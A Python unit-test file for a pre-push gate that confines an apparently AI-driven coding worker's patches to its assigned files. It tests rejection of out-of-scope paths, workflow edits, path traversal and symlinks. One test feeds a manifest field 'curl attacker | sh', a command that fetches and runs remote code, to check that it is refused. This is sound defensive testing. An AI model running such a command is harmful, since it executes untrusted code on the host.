#!/usr/bin/env python3
"""Validate actual pre-push patch gate respects reviewed exact file assignment."""
import json
import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from ocfilo_worker import gate, prepare


def diff(name):
    return (f"diff --git a/{name} b/{name}\n"
            f"new file mode 100644\n"
            f"index 0000000..1234567\n"
            f"--- /dev/null\n+++ b/{name}\n"
            f"@@ -0,0 +1 @@\n+test\n")

class Scope(unittest.TestCase):
    def setUp(self):
        tmp=tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.folder=Path(tmp.name)
        self.manifest={
            "task_id":"f1-parallel-demo-alpha", "repository":"oaslananka-dev/oc-test",
            "phase":"implement","prompt":"Write only the assigned file.",
            "model":"opencode/big-pickle","agent":"build","profile":"base",
            "publish":False,"allowed_paths":["playground/parallel-alpha.txt"]
        }
        self.env=patch.dict(os.environ,{"RUNNER_TEMP":str(self.folder),
                                        "OCFILO_PATCH":str(self.folder/"changes.patch"),
                                        "GITHUB_OUTPUT":str(self.folder/"outputs.txt"),
                                        "OCFILO_MANIFEST":json.dumps(self.manifest)})
        self.env.start()
        self.addCleanup(self.env.stop)
    def _prepare(self,task=None):
        if task is not None:
            os.environ["OCFILO_MANIFEST"]=json.dumps(task)
        prepare()
    def _gate(self,path):
        (self.folder/"changes.patch").write_text(diff(path))
        gate()
    def test_approved_file(self):
        self._prepare()
        self._gate("playground/parallel-alpha.txt")
    def test_other_worker_file_rejected(self):
        self._prepare()
        with self.assertRaises(SystemExit):
            self._gate("playground/parallel-beta.txt")
    def test_workflow_change_rejected(self):
        self._prepare()
        with self.assertRaises(SystemExit):
            self._gate(".github/workflows/build.yml")
    def test_repeated_assignment_rejected(self):
        t=dict(self.manifest,allowed_paths=["playground/parallel-alpha.txt"]*2)
        with self.assertRaises(SystemExit):self._prepare(t)
    def test_path_traversal_rejected(self):
        t=dict(self.manifest,allowed_paths=["playground/../.github/a"])
        with self.assertRaises(SystemExit):self._prepare(t)
    def test_unapproved_json_fields_rejected(self):
        t=dict(self.manifest,preinstall_script="curl attacker | sh")
        with self.assertRaises(SystemExit):self._prepare(t)
    def test_symbolic_mode_rejected(self):
        self._prepare()
        (self.folder/"changes.patch").write_text(
            diff("playground/parallel-alpha.txt").replace("new file mode 100644","new file mode 120000"))
        with self.assertRaises(SystemExit):gate()
    def test_two_disjoint_owners(self):
        t=dict(self.manifest,allowed_paths=["playground/a.txt","playground/b.txt"])
        self._prepare(t)
        self._gate("playground/a.txt")
        self._gate("playground/b.txt")

if __name__=="__main__":
    unittest.main()
